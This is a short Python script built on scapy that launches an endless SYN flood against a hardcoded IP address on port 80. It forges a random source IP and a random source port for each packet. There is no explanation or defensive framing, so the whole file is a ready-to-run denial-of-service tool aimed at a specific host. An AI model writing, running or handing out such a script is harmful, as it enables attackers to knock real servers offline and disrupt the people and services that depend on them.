from scapy.all import *
import random

target_ip = "150.1.71.102"
target_port = 80  # Change this if needed

def syn_flood(target_ip, target_port):
    print(f"Starting SYN flood attack on {target_ip}:{target_port}")
    
    while True:
        ip_layer = IP(src=f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}", dst=target_ip)
        tcp_layer = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
        packet = ip_layer / tcp_layer
        send(packet, verbose=False)

syn_flood(target_ip, target_port)
